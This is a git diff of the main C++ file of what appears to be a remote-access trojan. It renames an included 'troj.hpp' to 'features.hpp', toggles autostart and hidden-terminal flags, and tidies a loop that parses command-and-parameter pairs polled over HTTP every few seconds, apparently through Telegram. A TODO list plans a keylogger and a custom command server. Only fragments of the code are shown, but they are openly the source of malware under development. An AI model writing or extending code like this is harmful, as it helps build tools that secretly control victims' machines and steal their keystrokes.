@@ -2,14 +2,14 @@
 #include <time.h>
 #include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
-#include "troj.hpp"
+#include "features.hpp"
 #include "commands.hpp"
 
 using namespace std;
 using json = nlohmann::json;
 
 constexpr int REFRESH = 5; //in seconds
-constexpr bool AUTOSTART = 1; 
+constexpr bool AUTOSTART = 0; 
 constexpr bool HIDE_TERMINAL = 0;
 
 int main() {
@@ -35,11 +35,11 @@ int main() {
 			Send(ID);
 			continue;
 		}
-		queue<pair<string, string>> Q;
-		for (int i = 0, it = 0; i < parse.size(); i++) //parsing message
+		queue<pair<string, string>> Q; //command, parameters
+		for (size_t i = 0, it = 0; i < parse.size(); i++) //parsing message
 		{
 			if (parse[i] == ' ') {
-				it++; if(it <= 2)continue;
+				it++; if (it <= 2)continue;
 			}
 
 			if (parse.size() - i > 4) {
@@ -72,10 +72,9 @@ int main() {
 
 /*
 * TODOLIST
--clean up local files of project
 -make a handler for turing off
 -settings.json
--make keylogger inside of dupnix
+-make keylogger
                         //////WHEN EVERYTHING UPPER WILL BE DONE THEN IT'S VERSION 3.0
 -learn git
 -start writing own app and api instead of telegram
